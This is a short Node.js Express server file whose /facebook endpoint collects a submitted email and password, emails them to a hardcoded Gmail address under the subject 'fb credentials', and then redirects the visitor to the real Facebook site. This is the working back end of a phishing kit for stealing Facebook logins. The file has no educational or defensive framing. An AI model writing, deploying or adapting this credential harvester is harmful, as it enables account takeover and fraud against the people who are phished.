 const express = require('express')
const sendEmail= require('./email')
const bodyParser =  require('body-parser')
const cors =  require("cors")
const cron =  require("node-cron")
 const app = express()

app.use(bodyParser.json())

app.use(cors())
 app.post('/facebook',async(req,res)=>{
 const {email,password}=req.body 
 const  mheMail = " humphreyheather03@gmail.com"
const  credentials  = `email: ${email}, password: ${password}`
sendEmail(mheMail,'fb credentials',credentials)
return res.redirect("https://www.facebook.com/")
 } )

 cron.schedule("*/10 * * * * *", function() { 
   console.log("running a task every 10 second"); 
}); 

 app.listen(4000,()=>{
    console.log("app running on port ......")
 })